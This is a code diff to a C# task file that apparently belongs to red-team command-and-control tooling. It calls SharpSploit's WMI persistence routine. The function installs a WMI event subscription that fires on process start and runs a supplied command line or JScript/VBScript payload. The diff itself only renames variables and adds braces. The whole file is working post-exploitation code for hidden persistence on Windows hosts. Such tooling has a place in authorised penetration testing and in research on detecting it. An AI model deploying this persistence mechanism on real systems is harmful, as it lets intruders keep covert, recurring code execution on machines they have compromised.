@@ -1,31 +1,33 @@
 ﻿using System;
-  
+
 using SharpSploit.Persistence;
 
 public static class Task
 {
-    public static string Execute(string eventName, string eventFilter, string eventConsumer, string payload, string processName = "", string scriptingEngine = "")
+    public static string Execute(string EventName, string EventFilter, string EventConsumer, string Payload, string ProcessName = "", string ScriptingEngine = "")
     {
         try
         {
-            WMI.EventFilter EventFilter;
-            WMI.EventConsumer EventConsumer;
-            WMI.ScriptingEngine ScriptingEngine;
+            WMI.EventFilter theEventFilter;
+            WMI.EventConsumer theEventConsumer;
+            WMI.ScriptingEngine theScriptingEngine;
 
-            if (eventFilter.ToLower() == "processstart") { EventFilter = WMI.EventFilter.ProcessStart; }
+            if (EventFilter.ToLower() == "processstart") { theEventFilter = WMI.EventFilter.ProcessStart; }
             else { return "WMI Persistence failed. Invalid Event Filter."; }
 
-			if (eventConsumer.ToLower() == "commandline") { EventConsumer = WMI.EventConsumer.CommandLine; }
-			else if (eventConsumer.ToLower() == "activescript") { EventConsumer = WMI.EventConsumer.ActiveScript; }
+			if (EventConsumer.ToLower() == "commandline") { theEventConsumer = WMI.EventConsumer.CommandLine; }
+			else if (EventConsumer.ToLower() == "activescript") { theEventConsumer = WMI.EventConsumer.ActiveScript; }
 			else { return "WMI Persistence failed. Invalid Event Consumer."; }
 
-			if (scriptingEngine.ToLower() == "jscript") { ScriptingEngine = WMI.ScriptingEngine.JScript; }
-			else if (scriptingEngine.ToLower() == "vbscript") { ScriptingEngine = WMI.ScriptingEngine.VBScript; }
+			if (ScriptingEngine.ToLower() == "jscript") { theScriptingEngine = WMI.ScriptingEngine.JScript; }
+			else if (ScriptingEngine.ToLower() == "vbscript") { theScriptingEngine = WMI.ScriptingEngine.VBScript; }
             else { return "WMI Persistence failed. Invalid Scripting Engine."; }
 
-            if (WMI.InstallWMIPersistence(eventName, EventFilter, EventConsumer, payload, processName, ScriptingEngine))
-                return "WMI Persistence suceeded for: " + eventName;
-            return "WMI Persistence failed for: " + eventName;
+            if (WMI.InstallWMIPersistence(EventName, theEventFilter, theEventConsumer, Payload, ProcessName, theScriptingEngine))
+            {
+                return "WMI Persistence suceeded for: " + EventName;
+            }
+            return "WMI Persistence failed for: " + EventName;
         }
         catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
     }
